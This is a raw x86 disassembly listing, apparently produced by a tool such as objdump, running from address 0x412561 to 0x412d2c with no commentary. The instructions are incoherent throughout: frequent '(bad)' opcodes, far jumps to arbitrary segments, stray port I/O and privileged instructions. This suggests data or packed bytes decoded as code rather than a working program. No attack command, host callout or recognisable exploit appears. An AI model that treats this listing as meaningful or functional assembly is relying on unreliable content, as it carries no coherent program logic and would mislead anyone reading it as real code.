  412561:	stos   BYTE PTR es:[edi],al
  412562:	dec    esp
  412563:	adc    esp,DWORD PTR [ecx+0x61]
  412566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412568:	jle    0x41258b
  41256a:	idiv   BYTE PTR [edi-0x65]
  41256d:	pop    ebx
  41256e:	dec    ecx
  41256f:	lahf   
  412570:	bound  edx,QWORD PTR [esp+eax*8]
  412573:	popf   
  412574:	push   ds
  412575:	xor    al,0x5f
  412577:	loopne 0x4125ea
  412579:	mov    DWORD PTR [ebx+0x7eddc0c3],ebx
  41257f:	stos   DWORD PTR es:[edi],eax
  412580:	loop   0x41253c
  412582:	mov    bh,0xa4
  412584:	xor    BYTE PTR [edi+0x2],dl
  412587:	leave  
  412588:	push   eax
  412589:	cmp    DWORD PTR [ebx],edx
  41258b:	push   ebp
  41258c:	mov    ecx,0x22df9764
  412591:	aam    0xa3
  412593:	out    0x52,al
  412595:	js     0x412565
  412597:	pop    ecx
  412598:	fnstenv [edi-0x35]
  41259b:	fnstenv [eax]
  41259d:	lea    ebp,[ebp+edi*1+0x77]
  4125a1:	mov    edx,0x93ea2bff
  4125a6:	shl    BYTE PTR [ebx],cl
  4125a8:	stos   BYTE PTR es:[edi],al
  4125a9:	sbb    eax,0x93ed9448
  4125ae:	or     al,0x4b
  4125b0:	jl     0x41253d
  4125b2:	or     ah,BYTE PTR [esi-0x872cb86]
  4125b8:	xchg   esi,eax
  4125b9:	sti    
  4125ba:	adc    BYTE PTR [ebp-0x68],cl
  4125bd:	mov    cl,0x6
  4125bf:	mov    edx,0x646adda3
  4125c4:	sub    eax,0x648078a5
  4125c9:	pop    ebp
  4125ca:	inc    ecx
  4125cb:	and    ah,BYTE PTR [ebx+0x43b727ae]
  4125d1:	add    edi,ecx
  4125d3:	jl     0x412558
  4125d5:	xchg   edi,eax
  4125d6:	add    BYTE PTR [ebp-0x29],dl
  4125d9:	cmp    ch,ch
  4125db:	xchg   edi,eax
  4125dc:	test   al,0xe9
  4125de:	clc    
  4125df:	(bad)  
  4125e0:	pop    ebp
  4125e1:	scas   eax,DWORD PTR es:[edi]
  4125e2:	xchg   edi,eax
  4125e3:	mov    dh,0xc2
  4125e5:	retf   0xbcf7
  4125e8:	enter  0xb400,0x1c
  4125ec:	lods   al,BYTE PTR ds:[esi]
  4125ed:	push   eax
  4125ee:	ror    BYTE PTR [esi-0x64],cl
  4125f1:	jmp    0x779c24ae
  4125f6:	lds    ebp,FWORD PTR [eax+0x50d81f32]
  4125fc:	push   eax
  4125fd:	push   ebx
  4125fe:	scas   eax,DWORD PTR es:[edi]
  4125ff:	scas   eax,DWORD PTR es:[edi]
  412600:	sub    edx,DWORD PTR [eax+edi*1-0x603c3947]
  412607:	sbb    DWORD PTR [edx+0x75],ecx
  41260a:	ja     0x412598
  41260c:	pop    edx
  41260d:	pop    ecx
  41260e:	and    ebx,ebx
  412610:	jne    0x412637
  412612:	xchg   DWORD PTR ds:0x8aaafa50,esp
  412618:	pusha  
  412619:	push   edx
  41261a:	sub    bh,BYTE PTR [edi]
  41261c:	scas   al,BYTE PTR es:[edi]
  41261d:	pop    edx
  41261e:	aam    0xf4
  412620:	fs xor eax,0x21ea375d
  412626:	sbb    ebx,esi
  412628:	dec    eax
  412629:	mul    BYTE PTR [eax-0x74]
  41262c:	loope  0x4125fa
  41262e:	daa    
  41262f:	xchg   esp,eax
  412630:	cli    
  412631:	(bad)  
  412632:	mov    ebp,0x86d1e02d
  412637:	pop    ebp
  412638:	mov    DWORD PTR [edx],0xb2ab2739
  41263e:	jb     0x4126a8
  412640:	ficom  DWORD PTR [ebx]
  412642:	dec    esi
  412643:	mov    eax,ds:0x488c33a4
  412648:	add    esi,0xffffffba
  41264b:	call   0xd3c9:0x7953b76f
  412652:	adc    eax,0xda254f4e
  412657:	push   cs
  412658:	jp     0x412646
  41265a:	sahf   
  41265b:	mov    dl,0x12
  41265d:	enter  0x97ce,0xd2
  412661:	xor    BYTE PTR [ecx+esi*8],dh
  412664:	push   ds
  412665:	shl    DWORD PTR [ebx+edi*2+0x20],cl
  412669:	adc    ebx,DWORD PTR [edx-0x18ed8d67]
  41266f:	outs   dx,DWORD PTR ds:[esi]
  412670:	(bad)  [edx]
  412672:	sub    cl,bl
  412674:	mov    ebx,0x933e8685
  412679:	xchg   edi,eax
  41267a:	sub    DWORD PTR ss:[eax+0x13],0x57
  41267f:	test   al,0x73
  412681:	fsub   DWORD PTR [ebx-0x26]
  412684:	dec    ebx
  412685:	fwait
  412686:	ins    DWORD PTR es:[edi],dx
  412687:	jbe    0x41264b
  412689:	daa    
  41268a:	aam    0x12
  41268c:	fwait
  41268d:	mov    ah,0xf5
  41268f:	or     BYTE PTR [edx],dh
  412691:	mov    ds:0xa0d523f8,al
  412696:	or     eax,0xc935cf50
  41269b:	jg     0x4126d6
  41269d:	mov    al,0x39
  41269f:	mov    esp,0xbfc21062
  4126a4:	ret    0xe809
  4126a7:	xchg   edx,eax
  4126a8:	adc    dh,BYTE PTR [ecx+ebp*1+0x64d6c42a]
  4126af:	(bad)  
  4126b0:	cwde   
  4126b1:	mov    esi,ecx
  4126b3:	out    0x3c,al
  4126b5:	mov    ds,WORD PTR [ecx]
  4126b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126b8:	sub    eax,0x1026c098
  4126bd:	push   0xffffffde
  4126bf:	mov    dl,0x65
  4126c1:	and    ebp,ecx
  4126c3:	aam    0xea
  4126c5:	(bad)  
  4126c6:	adc    edi,edx
  4126c8:	aaa    
  4126c9:	sub    eax,0xad99281d
  4126ce:	in     al,dx
  4126cf:	into   
  4126d0:	lods   eax,DWORD PTR ds:[esi]
  4126d1:	icebp  
  4126d2:	pop    esi
  4126d3:	ret    0x59bd
  4126d6:	sbb    BYTE PTR [ebp-0x76b90a2c],bl
  4126dc:	repz jmp 0x412702
  4126df:	leave  
  4126e0:	pop    edi
  4126e1:	cld    
  4126e2:	out    dx,al
  4126e3:	adc    ebp,DWORD PTR [ebp+0x2466782b]
  4126e9:	mov    dh,BYTE PTR [edx-0x4d]
  4126ec:	call   0x46164535
  4126f1:	sub    esi,esi
  4126f3:	or     DWORD PTR [ebx+0x6f],esp
  4126f6:	jne    0x412745
  4126f8:	test   DWORD PTR [edx],0x41b2fd50
  4126fe:	add    BYTE PTR ds:[eax-0x64],cl
  412702:	cmp    eax,0xbaa05397
  412707:	out    dx,eax
  412708:	add    ebx,DWORD PTR [ecx+0x23ba9044]
  41270e:	clc    
  41270f:	gs enter 0xe308,0x56
  412714:	pop    ebp
  412715:	push   ebx
  412716:	jmp    0xb66:0x3098ffdd
  41271d:	mov    edi,0x80d80ef7
  412722:	mov    bl,0xa6
  412724:	int    0x64
  412726:	inc    eax
  412727:	(bad)  
  412728:	js     0x4126e2
  41272a:	mov    ebx,0x691c9adc
  41272f:	adc    BYTE PTR [esi],al
  412731:	and    BYTE PTR [edx-0x31],dl
  412734:	ja     0x412763
  412736:	iret   
  412737:	adc    al,0x71
  412739:	icebp  
  41273a:	shl    edx,1
  41273c:	pop    ss
  41273d:	(bad)  
  41273e:	rol    BYTE PTR [eax+esi*8],1
  412741:	mov    ebx,0x7727faa
  412746:	retf   0xd2f5
  412749:	jecxz  0x41279f
  41274b:	int3   
  41274c:	sub    ecx,esp
  41274e:	xor    bh,BYTE PTR [edx-0x2a799cb8]
  412754:	mov    edx,0x77880e2d
  412759:	lock pop ss
  41275b:	mov    eax,0x1eb2ddb8
  412760:	std    
  412761:	mov    edx,0x60a9ee86
  412766:	mov    esp,0xcdaf94f6
  41276b:	pusha  
  41276c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41276d:	jnp    0x41275a
  41276f:	ins    DWORD PTR es:[edi],dx
  412770:	push   esp
  412771:	cld    
  412772:	rcl    BYTE PTR [eax+ebx*2],cl
  412775:	jmp    0xa42c:0xd43ceb5c
  41277c:	mov    dl,0x6d
  41277e:	and    DWORD PTR [edi+0x64],ecx
  412781:	and    eax,0xa842f0fb
  412786:	jecxz  0x4127ec
  412788:	scas   eax,DWORD PTR es:[edi]
  412789:	jmp    0x2fc1:0x4c4c3f83
  412790:	push   edx
  412791:	xchg   ebp,eax
  412792:	mov    esi,0xec8b2493
  412797:	xor    ebp,DWORD PTR [ebp-0x2e]
  41279a:	or     eax,0xd1f72ad0
  41279f:	in     eax,0xab
  4127a1:	xor    al,0xb9
  4127a3:	mov    edi,0x3818f30b
  4127a8:	sahf   
  4127a9:	(bad)  
  4127aa:	and    edi,DWORD PTR [edi+0x1]
  4127ad:	inc    edi
  4127ae:	bound  ebx,QWORD PTR [eax]
  4127b0:	test   al,0xcb
  4127b2:	fcmovu st,st(2)
  4127b4:	loope  0x4127f3
  4127b6:	mov    bp,0xd95d
  4127ba:	mov    edx,0x5dd9f92d
  4127bf:	leave  
  4127c0:	cmp    ah,BYTE PTR [edx]
  4127c2:	jmp    0x1fd9:0x8a09eeb8
  4127c9:	icebp  
  4127ca:	jle    0x4127bb
  4127cc:	push   cs
  4127cd:	mov    ?,edi
  4127cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d0:	push   ecx
  4127d1:	cmp    edx,esi
  4127d3:	cwde   
  4127d4:	js     0x4127f9
  4127d6:	bound  edx,QWORD PTR [eax+0x39fe77d8]
  4127dc:	(bad)
  4127e0:	sbb    ebp,DWORD PTR [esi+0x6ad65e5e]
  4127e6:	clc    
  4127e7:	bound  edx,QWORD PTR [ecx-0x80]
  4127ea:	push   edi
  4127eb:	enter  0x7acc,0x9b
  4127ef:	les    eax,FWORD PTR [ebx-0x5e]
  4127f2:	xchg   DWORD PTR [ecx+0x1b083d13],edx
  4127f8:	mov    bl,0xbd
  4127fa:	lods   eax,DWORD PTR ds:[esi]
  4127fb:	je     0x412874
  4127fd:	jl     0x412864
  4127ff:	fs sar ch,cl
  412802:	fistp  QWORD PTR gs:[edx*2-0x53f6b8a4]
  41280a:	dec    DWORD PTR [esi]
  41280c:	and    BYTE PTR [edx-0x3c],ah
  41280f:	pop    edi
  412810:	mov    ah,0x2a
  412812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412813:	hlt    
  412814:	out    0x89,al
  412816:	in     al,dx
  412817:	mov    al,0xde
  412819:	jge    0x4127b8
  41281b:	test   esp,0x898dbd6c
  412821:	and    cl,BYTE PTR [ebp+0x55e9f333]
  412827:	mov    bl,0xe7
  412829:	icebp  
  41282a:	in     eax,0x93
  41282c:	push   eax
  41282d:	dec    esp
  41282e:	repnz dec esp
  412830:	cs mov esi,0x9d82ac60
  412836:	lahf   
  412837:	ret    0xac1f
  41283a:	xchg   ebx,eax
  41283b:	adc    al,0xe0
  41283d:	inc    edi
  41283e:	and    dh,bl
  412840:	daa    
  412841:	fcomp  DWORD PTR [edx]
  412843:	(bad)  
  412844:	fld    DWORD PTR [edi-0x16]
  412847:	push   cs
  412848:	inc    esi
  412849:	mov    ah,BYTE PTR [edx]
  41284b:	adc    dh,BYTE PTR [edi]
  41284d:	jmp    0x633c:0xd07184fb
  412854:	xor    eax,0xe6ef63b1
  412859:	adc    edx,DWORD PTR [esi]
  41285b:	jmp    0x149ede65
  412860:	pop    eax
  412861:	jne    0x41284e
  412863:	jl     0x4128b4
  412865:	loop   0x41282e
  412867:	int3   
  412868:	into   
  412869:	adc    edx,ebx
  41286b:	push   cs
  41286c:	xor    BYTE PTR [ebx+0x7981f394],ah
  412872:	(bad)  
  412873:	and    BYTE PTR [ecx],ch
  412875:	sub    ebp,DWORD PTR [eax]
  412877:	or     al,0x68
  412879:	dec    BYTE PTR [ecx+esi*1]
  41287c:	mov    dl,0x36
  41287e:	ins    BYTE PTR es:[edi],dx
  41287f:	push   ss
  412880:	mov    ds:0xa7651706,eax
  412885:	dec    ebp
  412886:	add    ebx,DWORD PTR [eax+0x62]
  412889:	rcl    BYTE PTR [esi-0x33a0aa07],1
  41288f:	push   ebx
  412890:	repnz mov ebx,0x333144b8
  412896:	fcomp  QWORD PTR [ebp-0x5]
  412899:	adc    ebx,DWORD PTR [esi-0x4c54e125]
  41289f:	mov    dl,BYTE PTR ds:0x892ca8f6
  4128a5:	xor    DWORD PTR [ebx-0x59af4461],esp
  4128ab:	sub    eax,0x989f9c20
  4128b0:	retf   
  4128b1:	stos   BYTE PTR es:[edi],al
  4128b2:	aaa    
  4128b3:	sbb    BYTE PTR [edi-0x2ca54638],0xa0
  4128ba:	(bad)  
  4128bb:	xlat   BYTE PTR ds:[ebx]
  4128bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128bd:	fadd   DWORD PTR [edi-0x54]
  4128c0:	jo     0x4128ec
  4128c2:	mov    ds:0x18af0893,eax
  4128c7:	leave  
  4128c8:	jmp    0x1151:0x75097b47
  4128cf:	in     al,0x26
  4128d1:	fwait
  4128d2:	xchg   ebp,eax
  4128d3:	push   eax
  4128d4:	call   0x1fbfe601
  4128d9:	outs   dx,DWORD PTR ds:[esi]
  4128da:	jle    0x41290d
  4128dc:	inc    esp
  4128dd:	and    eax,0x59f4b624
  4128e2:	cmc    
  4128e3:	retf   
  4128e4:	les    edi,FWORD PTR ds:0x1f25949d
  4128ea:	jno    0x412967
  4128ec:	popf   
  4128ed:	xor    DWORD PTR [bx],ebp
  4128f0:	dec    edi
  4128f1:	cmc    
  4128f2:	rcl    BYTE PTR [esi-0x6d],0xd5
  4128f6:	xchg   ecx,eax
  4128f7:	inc    ecx
  4128f8:	ss out dx,eax
  4128fa:	js     0x412954
  4128fc:	jns    0x412887
  4128fe:	fstp   QWORD PTR [ebx-0x75]
  412901:	inc    ecx
  412902:	and    eax,0x413b5a7f
  412907:	push   0xffffffc0
  412909:	sub    ah,BYTE PTR [edi]
  41290b:	stos   DWORD PTR es:[edi],eax
  41290c:	addr16 mov eax,0xb7507aa6
  412912:	dec    edi
  412913:	xchg   edx,eax
  412914:	clc    
  412915:	mov    ds:0x9c0b7630,eax
  41291a:	test   DWORD PTR [esp+eiz*8],ecx
  41291d:	or     bh,BYTE PTR [edx-0x4c22c2b5]
  412923:	je     0x4128d2
  412925:	dec    edi
  412926:	les    edi,FWORD PTR [edi+edi*2+0x33005973]
  41292d:	test   DWORD PTR [edi],eax
  41292f:	call   0x17c9:0xd6d80959
  412936:	inc    edx
  412937:	jle    0x4128f0
  412939:	mov    al,0x81
  41293b:	xchg   esi,eax
  41293c:	frstor [ebx]
  41293e:	xchg   DWORD PTR [edx+0xdf89eb5],ebp
  412944:	mov    ?,WORD PTR [ebp+0x6b55b777]
  41294a:	add    eax,0x569b801
  41294f:	test   al,0xfa
  412951:	(bad)  
  412952:	cwde   
  412953:	out    dx,eax
  412954:	mov    ds:0x1ff843af,al
  412959:	out    dx,al
  41295a:	iret   
  41295b:	std    
  41295c:	repz frstor [esp+ecx*2-0x2e]
  412961:	xor    dh,BYTE PTR [esi]
  412963:	dec    eax
  412964:	pusha  
  412965:	dec    ebp
  412966:	inc    ecx
  412967:	arpl   WORD PTR [eax-0x18],di
  41296a:	sbb    BYTE PTR [ebx+0x63fc4136],0x1d
  412971:	adc    ebp,DWORD PTR [edx+edx*1+0x24a8ab57]
  412978:	add    al,0x1f
  41297a:	scas   eax,DWORD PTR es:[edi]
  41297b:	outs   dx,DWORD PTR ds:[esi]
  41297c:	inc    ecx
  41297d:	(bad)  [esp+esi*8+0x65526599]
  412984:	ror    BYTE PTR [edi-0x5f],1
  412987:	xchg   esi,eax
  412988:	mov    ecx,0x80f353fd
  41298d:	into   
  41298e:	xor    DWORD PTR [edx],ebx
  412990:	popf   
  412991:	call   0x7948:0xa6859358
  412998:	lock adc dh,dh
  41299b:	(bad)  
  41299c:	test   BYTE PTR [esi+eax*8+0x62],bh
  4129a0:	gs int3 
  4129a2:	jp     0x412964
  4129a4:	push   0xffffffbc
  4129a6:	mov    al,0xcf
  4129a8:	and    ebp,ebx
  4129aa:	in     eax,0x49
  4129ac:	cmp    al,dh
  4129ae:	sahf   
  4129af:	pop    edi
  4129b0:	sub    dl,dl
  4129b2:	sub    DWORD PTR [ebp-0x4c],0x4ffb60b
  4129b9:	sub    bl,BYTE PTR [ebp-0x2c3cdc11]
  4129bf:	sbb    DWORD PTR [esi-0x6f2f2fd3],eax
  4129c5:	hlt    
  4129c6:	retf   0x15f1
  4129c9:	lea    ecx,[ecx]
  4129cb:	test   BYTE PTR [eax+eax*2],0x68
  4129cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d0:	dec    edx
  4129d1:	jp     0x4129ef
  4129d3:	repnz retf 
  4129d5:	add    BYTE PTR [ebx-0x38219590],0x42
  4129dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129dd:	shl    DWORD PTR [ecx],1
  4129df:	add    ebp,DWORD PTR ds:0xb4dc2160
  4129e5:	pop    edi
  4129e6:	sub    eax,DWORD PTR [edi]
  4129e8:	sti    
  4129e9:	mov    esi,esp
  4129eb:	rol    DWORD PTR [ecx+0x53],0xc4
  4129ef:	imul   edx,DWORD PTR [edx+0x6736bdea],0x1286ebb9
  4129f9:	lods   al,BYTE PTR ds:[esi]
  4129fa:	push   ecx
  4129fb:	cs mov dl,0xe
  4129fe:	sub    DWORD PTR [ecx+0x414b4e09],ebp
  412a04:	and    al,0xe9
  412a06:	xchg   ebx,eax
  412a07:	add    DWORD PTR [ebp+0x390d5546],eax
  412a0d:	jg     0x4129c1
  412a0f:	sbb    al,0x3e
  412a11:	jmp    DWORD PTR [eax]
  412a13:	mov    ds:0x1b9ea8be,al
  412a18:	or     eax,0xfb8d8816
  412a1d:	inc    edi
  412a1e:	cmp    BYTE PTR [edi-0x695b8672],bl
  412a24:	add    al,0x1a
  412a26:	test   eax,0x47714d88
  412a2b:	inc    esp
  412a2c:	out    0xfa,eax
  412a2e:	mov    bl,bh
  412a30:	mov    al,0x15
  412a32:	int3   
  412a33:	xchg   esi,eax
  412a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a35:	imul   edx,DWORD PTR [ecx],0x909d8099
  412a3b:	ret    
  412a3c:	ds jp  0x412a8b
  412a3f:	push   ebx
  412a40:	sub    ebx,eax
  412a42:	pop    edi
  412a43:	js     0x4129cc
  412a45:	mov    BYTE PTR [edi],bh
  412a47:	push   0x3b
  412a49:	jl     0x412a92
  412a4b:	mov    ebp,0x6f9798d2
  412a50:	sbb    BYTE PTR [eax+0x3d],0x16
  412a54:	cmp    DWORD PTR [ebx-0x65390a95],eax
  412a5a:	aaa    
  412a5b:	or     bh,BYTE PTR ds:0xc1091664
  412a61:	cmp    al,0xc1
  412a63:	clc    
  412a64:	imul   ebx,DWORD PTR [eax+edx*2],0x3c
  412a68:	mov    ebx,0x9646ae5f
  412a6d:	outs   dx,BYTE PTR ds:[esi]
  412a6e:	cmp    al,0xb7
  412a70:	push   0xb0dfb334
  412a75:	push   ds
  412a76:	clc    
  412a77:	xlat   BYTE PTR ds:[ebx]
  412a78:	mov    DWORD PTR [edx-0x33bf050f],eax
  412a7e:	mov    dl,0xd0
  412a80:	push   ds
  412a81:	lods   eax,DWORD PTR ds:[esi]
  412a82:	in     eax,dx
  412a83:	sbb    ecx,DWORD PTR [eax]
  412a85:	ss cmp al,0x48
  412a88:	mov    ch,0x9f
  412a8a:	ror    DWORD PTR [esi+eiz*4-0x49d3a439],1
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	sub    DWORD PTR [edi],esp
  412a94:	lahf   
  412a95:	xor    eax,0xa7f3661e
  412a9a:	or     al,0xa
  412a9c:	aaa    
  412a9d:	mov    edi,0x3ca053c2
  412aa2:	daa    
  412aa3:	xchg   esp,eax
  412aa4:	lea    cx,[ecx-0x677832f]
  412aab:	repz test al,0xd7
  412aae:	and    BYTE PTR [edi],al
  412ab0:	mov    esp,0x3388714e
  412ab5:	not    DWORD PTR [edi+0x29]
  412ab8:	inc    esp
  412ab9:	sbb    al,0xb8
  412abb:	retf   
  412abc:	(bad)  
  412abd:	or     BYTE PTR [ecx+0x3d],dl
  412ac0:	lahf   
  412ac1:	mov    cl,0x68
  412ac3:	mov    eax,0x816527fd
  412ac8:	inc    ebx
  412ac9:	push   ss
  412aca:	pop    esp
  412acb:	dec    eax
  412acc:	ja     0x412a6a
  412ace:	and    al,0x2c
  412ad0:	jae    0x412a8a
  412ad2:	push   ecx
  412ad3:	(bad)  
  412ad4:	test   DWORD PTR [esp+edx*1],0x56abc541
  412adb:	jnp    0x412b48
  412add:	ret    0xbe5d
  412ae0:	or     DWORD PTR [ebx+esi*4],eax
  412ae3:	mov    dl,0x3b
  412ae5:	mov    al,0xd5
  412ae7:	mov    ebp,0x1df4ffe2
  412aec:	and    eax,DWORD PTR [ecx+0x7]
  412aef:	mov    esp,cs
  412af1:	stc    
  412af2:	jns    0x412b45
  412af4:	pop    esi
  412af5:	xchg   esi,eax
  412af6:	xor    eax,0xe6e794f3
  412afb:	mov    WORD PTR [eax+0x22],?
  412afe:	inc    ebx
  412aff:	xchg   edi,eax
  412b00:	dec    edx
  412b01:	cmp    BYTE PTR [edx+0x60],ch
  412b04:	fisubr DWORD PTR [ebp-0x46bbed94]
  412b0a:	mov    al,ds:0x634fb059
  412b0f:	js     0x412ab6
  412b11:	loopne 0x412b67
  412b13:	imul   ecx,edi,0x9ed812fc
  412b19:	xchg   edx,eax
  412b1a:	cld    
  412b1b:	xchg   esp,eax
  412b1c:	inc    edi
  412b1d:	ja     0x412b36
  412b1f:	adc    ch,BYTE PTR [edx+0x19]
  412b22:	inc    ebp
  412b23:	loopne 0x412b9a
  412b25:	push   ebp
  412b26:	push   ds
  412b27:	mov    BYTE PTR [esi-0x72],ah
  412b2a:	jl     0x412ab9
  412b2c:	xor    esi,eax
  412b2e:	(bad)  
  412b30:	shl    BYTE PTR [eax+0x5b0d1a6],0x14
  412b37:	outs   dx,DWORD PTR ds:[esi]
  412b38:	jl     0x412ac0
  412b3a:	adc    eax,0x5352f270
  412b3f:	mov    ds:0xba9e6bef,eax
  412b44:	pop    eax
  412b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b46:	jmp    0x412b50
  412b48:	outs   dx,BYTE PTR ds:[esi]
  412b49:	pop    ds
  412b4a:	stos   BYTE PTR es:[edi],al
  412b4b:	push   ds
  412b4c:	aam    0x8c
  412b4e:	push   ds
  412b4f:	dec    edi
  412b50:	out    0x30,al
  412b52:	ror    BYTE PTR [esi+0xb],0x11
  412b56:	bound  edx,QWORD PTR [eax]
  412b58:	retf   0x2a63
  412b5b:	xchg   ecx,eax
  412b5c:	mov    edx,0x925bf2b0
  412b61:	xor    bh,bl
  412b63:	cmp    eax,0xf4dc498a
  412b68:	mov    dh,BYTE PTR ds:0xf0e66db4
  412b6e:	cld    
  412b6f:	xchg   edx,eax
  412b70:	mov    ebp,0x4ef94b20
  412b75:	dec    eax
  412b76:	xchg   ebx,eax
  412b77:	cmp    DWORD PTR [ebp+0x3b],ecx
  412b7a:	jle    0x412b8f
  412b7c:	jmp    0x412b9f
  412b7e:	stc    
  412b7f:	fdivrp st(0),st
  412b81:	mov    ch,0xaf
  412b83:	imul   eax,DWORD PTR [ebx+0x33],0xffffff8d
  412b87:	jg     0x412b95
  412b89:	lods   al,BYTE PTR ds:[esi]
  412b8a:	and    BYTE PTR [edi+edx*8],dh
  412b8d:	adc    ch,BYTE PTR [ecx+esi*1+0x23]
  412b91:	and    DWORD PTR [eax-0x12],esp
  412b94:	mov    dl,0xbd
  412b96:	call   0xc76:0x18f06743
  412b9d:	cld    
  412b9e:	addr16 xor al,0x17
  412ba2:	in     al,0x70
  412ba4:	push   ecx
  412ba5:	jno    0x412b57
  412ba7:	xchg   edi,eax
  412ba8:	out    0x77,eax
  412baa:	(bad)  
  412bab:	not    DWORD PTR [edi]
  412bad:	call   0xb91d:0xb9f1230a
  412bb4:	cs stc 
  412bb6:	sub    eax,0xaef3f8fe
  412bbb:	fld    DWORD PTR [edx]
  412bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bbe:	retf   
  412bbf:	or     eax,0x4505e864
  412bc4:	scas   eax,DWORD PTR es:[edi]
  412bc5:	mov    ebx,0xed3d8985
  412bca:	ins    BYTE PTR es:[edi],dx
  412bcb:	(bad)  
  412bcd:	sahf   
  412bce:	outs   dx,DWORD PTR ds:[esi]
  412bcf:	and    ecx,DWORD PTR [edi+0x6623acd8]
  412bd5:	test   dl,0x50
  412bd8:	xor    ah,BYTE PTR [edi+0x29]
  412bdb:	scas   al,BYTE PTR es:[edi]
  412bdc:	cmp    edx,DWORD PTR [ebp-0x23f4a60b]
  412be2:	jle    0x412c18
  412be4:	xchg   edi,eax
  412be5:	sti    
  412be6:	arpl   dx,cx
  412be8:	jno    0x412bfa
  412bea:	xchg   BYTE PTR [edi-0x204cda89],ch
  412bf0:	repz xchg esi,eax
  412bf2:	or     dh,bh
  412bf4:	test   DWORD PTR [esi],edx
  412bf6:	mov    al,gs:0xb948d6bf
  412bfc:	xchg   esi,eax
  412bfd:	add    ch,ch
  412bff:	mov    eax,ds:0x13f10df9
  412c04:	(bad)  
  412c05:	dec    edi
  412c06:	pop    edi
  412c07:	cwde   
  412c08:	pop    ebx
  412c09:	test   BYTE PTR [ebx],0xc2
  412c0c:	lods   eax,DWORD PTR ds:[esi]
  412c0d:	jge    0x412c75
  412c0f:	(bad)  
  412c10:	repz jmp 0x412c28
  412c13:	push   edi
  412c14:	out    dx,eax
  412c15:	iret   
  412c16:	fs iret 
  412c18:	dec    eax
  412c19:	imul   edi,DWORD PTR [edi+0x44a6d2f],0xffffff80
  412c20:	cs jnp 0x412bb0
  412c23:	sar    BYTE PTR [ebx+0x65],cl
  412c26:	adc    BYTE PTR [ebp-0x35],0xcb
  412c2a:	push   esp
  412c2b:	pop    es
  412c2c:	mov    esp,0x8167815a
  412c31:	fld    DWORD PTR [ebp-0x569f6c78]
  412c37:	jb     0x412c49
  412c39:	sub    eax,0x9982d09b
  412c3e:	ret    
  412c3f:	cmp    eax,0x74dfeffb
  412c44:	and    eax,0x8e222ac0
  412c49:	(bad)  
  412c4a:	adc    DWORD PTR [ebx],ebx
  412c4c:	fucomi st,st(7)
  412c4e:	lahf   
  412c4f:	repnz mov ecx,eax
  412c52:	jbe    0x412c18
  412c54:	retf   
  412c55:	retf   0x1ad6
  412c58:	mov    cs,WORD PTR [ebx+ecx*2-0x1b128a2c]
  412c5f:	cmp    BYTE PTR [esi-0x31],al
  412c62:	leave  
  412c63:	lods   al,BYTE PTR ds:[esi]
  412c64:	out    dx,al
  412c65:	inc    ebx
  412c66:	add    al,0x96
  412c68:	jle    0x412c47
  412c6a:	mov    eax,0xdd4a20c3
  412c6f:	test   DWORD PTR [esi],ebp
  412c71:	stc    
  412c72:	dec    ebx
  412c73:	js     0x412c3c
  412c75:	adc    al,0x6d
  412c77:	sub    eax,0xd4519a58
  412c7c:	push   ebx
  412c7e:	and    al,0x26
  412c80:	fdivr  st,st(5)
  412c82:	rcl    BYTE PTR [edi-0x6c],0xd7
  412c86:	xchg   ecx,eax
  412c87:	jnp    0x412cc4
  412c89:	jnp    0x412ca4
  412c8b:	test   eax,0x9ae57c0
  412c90:	sbb    bl,bl
  412c92:	neg    edx
  412c94:	fisub  WORD PTR [eax-0x4b]
  412c97:	pop    ss
  412c98:	pop    es
  412c99:	jmp    0x7d9b4b38
  412c9e:	shl    DWORD PTR [esi+ebx*2-0x66],1
  412ca2:	out    dx,eax
  412ca3:	push   es
  412ca4:	test   eax,0x286dda94
  412ca9:	dec    eax
  412caa:	es adc eax,0x90f8619d
  412cb0:	popa   
  412cb1:	(bad)  
  412cb2:	pop    ebx
  412cb3:	cmp    al,0xbf
  412cb5:	jl     0x412cd8
  412cb7:	push   ebx
  412cb8:	push   eax
  412cb9:	ret    0x59c0
  412cbc:	rcr    BYTE PTR [ebx+eax*1+0x63],cl
  412cc0:	jecxz  0x412d1c
  412cc2:	imul   ecx,DWORD PTR [ecx-0x23],0x69
  412cc6:	or     ebp,esp
  412cc8:	mov    ah,0x44
  412cca:	hlt    
  412ccb:	in     al,0x50
  412ccd:	mov    ebx,cs
  412ccf:	(bad)  
  412cd0:	cdq    
  412cd1:	fcmovu st,st(3)
  412cd3:	test   dh,ah
  412cd5:	data16 std 
  412cd7:	fs mov bl,0xfb
  412cda:	adc    BYTE PTR [ecx+0x6ab8316c],dh
  412ce0:	adc    al,0x55
  412ce2:	shr    DWORD PTR ds:0x86db9d07,0xd6
  412ce9:	adc    dl,BYTE PTR [edi]
  412ceb:	mov    ecx,0x2ba059ea
  412cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cf1:	push   edi
  412cf2:	jb     0x412d41
  412cf4:	lods   eax,DWORD PTR ds:[esi]
  412cf5:	and    DWORD PTR ds:0xccfa1339,esi
  412cfb:	nop
  412cfc:	pop    ecx
  412cfd:	sub    esp,DWORD PTR [ebp+0x553fa8fd]
  412d03:	icebp  
  412d04:	xor    cl,BYTE PTR [edi+0x74]
  412d07:	inc    ebx
  412d08:	nop
  412d09:	sub    esi,esi
  412d0b:	mov    bh,0x68
  412d0d:	stos   DWORD PTR es:[edi],eax
  412d0e:	push   edi
  412d0f:	arpl   cx,si
  412d11:	and    BYTE PTR [edx+ebx*2],bl
  412d14:	inc    esp
  412d15:	nop
  412d16:	sub    BYTE PTR [ebp-0x6993b39a],ch
  412d1c:	out    0x8c,al
  412d1e:	mov    al,ds:0xeb244d
  412d23:	jne    0x412d64
  412d25:	call   DWORD PTR [ecx+edi*1+0x352d78b0]
  412d2c:	xchg   edi,eax
